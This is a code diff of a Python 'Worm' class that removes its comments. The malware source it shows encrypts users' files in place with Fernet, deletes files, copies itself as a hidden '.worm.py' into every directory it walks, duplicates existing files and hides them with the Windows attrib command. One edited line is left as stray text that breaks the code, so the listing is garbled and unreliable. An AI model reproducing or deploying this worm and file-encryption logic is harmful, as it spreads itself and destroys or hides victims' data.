@@ -20,28 +20,22 @@ class Worm:
             self.iteration = 2
         else:
             self.iteration = iteration
-        # get own absolute path
+        
         self.own_path = os.path.realpath(__file__)
 
     def list_directories(self, path, flag):
         self.target_dir_list.append(path)
         files_in_current_directory = os.listdir(path)
         for file_name in files_in_current_directory:
-            # avoid hidden files/directories (start with dot (.))
             if not file_name.startswith('.'):
-                # get the full path
                 absolute_path = os.path.join(path, file_name)
-                # if flag is 1, encrypt all files.
                 if flag == 1:
-                    if os.path.isfile(absolute_path):  # Check if it's a file before trying to open it
-                        # opening the original file to encrypt
+                    if os.path.isfile(absolute_path):  
                         with open(absolute_path, 'rb') as file:
                             original = file.read()
 
-                        # encrypting the file
                         encrypted = fernet.encrypt(original)
-                        # opening the file in write mode and 
-                        # writing the encrypted data
+                        
                         with open(absolute_path, 'wb') as encrypted_file:
                             encrypted_file.write(encrypted)
                         os.remove(file_name)
@@ -51,9 +45,9 @@ class Worm:
     def create_new_worm(self):
         for directory in self.target_dir_list:
             destination = os.path.join(directory, ".worm.py")
-            # copy the script in the new directory with similar name
+            directory with similar name
             shutil.copyfile(self.own_path, destination)
-            # Set the copied file as hidden
+            
             self.set_hidden_attribute(destination)
 
     def copy_existing_files(self):
@@ -67,7 +61,7 @@ class Worm:
                         destination = os.path.join(directory, (file_name+str(i)))
                         try:
                             shutil.copyfile(source, destination)
-                            # Set the copied file as hidden
+                            
                             self.set_hidden_attribute(destination)
                         except PermissionError as e:
                             print(f"Permission denied: {e}")
@@ -75,7 +69,7 @@ class Worm:
 
 
     def set_hidden_attribute(self, file_path):
-        # Set the file as hidden using the attrib command
+        
         try:
             subprocess.run(['attrib', '+h', file_path], shell=True, check=True)
         except subprocess.CalledProcessError as e:
